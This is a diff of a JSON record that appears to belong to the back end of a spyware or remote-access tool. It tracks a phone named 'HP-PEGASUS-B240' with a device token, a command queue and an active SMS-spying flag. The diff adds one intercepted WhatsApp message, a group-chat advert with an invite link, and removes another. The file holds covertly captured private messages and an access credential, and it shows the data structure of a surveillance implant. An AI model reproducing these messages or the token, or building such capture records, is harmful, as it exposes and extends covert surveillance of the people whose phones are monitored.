@@ -5404,7 +5404,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777380030531,
+    "lastSeen": 1777380039535,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -5420,6 +5420,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "GB ALL GAME V¹ | REGZ STORE",
+        "content": "~ BURRSHOP: 📷 NED STOK GAGAH? DANA CUMA 0-50K? MASUK AJA GRUP LINK DI BAWAH\nhttps://chat.whatsapp.com/BUNekCawn3dG3i5ZzxsNUa?mode=gi_t",
+        "time": "28/04 19:40",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777380033141
+      },
       {
         "appName": "WhatsApp",
         "sender": "GB ALL GAME V¹ | REGZ STORE: ~ BURRSHOP",
@@ -9411,14 +9419,6 @@
         "time": "28/04 01:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1777314526195
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Memeriksa pesan baru",
-        "time": "28/04 00:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777310519517
       }
     ],
     "galleryPhotos": [],
